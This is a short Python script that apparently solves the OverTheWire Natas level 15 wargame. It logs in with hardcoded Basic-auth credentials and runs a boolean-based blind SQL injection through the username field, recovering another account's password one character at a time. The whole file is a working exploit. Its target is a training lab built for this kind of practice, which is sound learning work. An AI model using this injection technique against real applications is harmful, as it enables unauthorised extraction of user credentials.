from base64 import b64encode
from itertools import chain
import requests

idx = 0
pw = ''
url = 'http://natas15.natas.labs.overthewire.org/index.php'
userAndPass = b64encode(b"natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J").decode("ascii")
headers = {'Authorization': 'Basic %s' % userAndPass}
while idx < 32:
    idx += 1
    print(f"looking for {idx}")
    asciis = chain(range(48, 58), range(65, 91), range(97, 123))
    for a in asciis:
        res = requests.post(url, headers=headers,
                            data={'username': f"natas16\" AND ASCII(SUBSTRING(password,{idx},1))={a} AND 1=\"1"})
        if "user exists" in res.text:
            pw += chr(a)
            print(pw)
            break
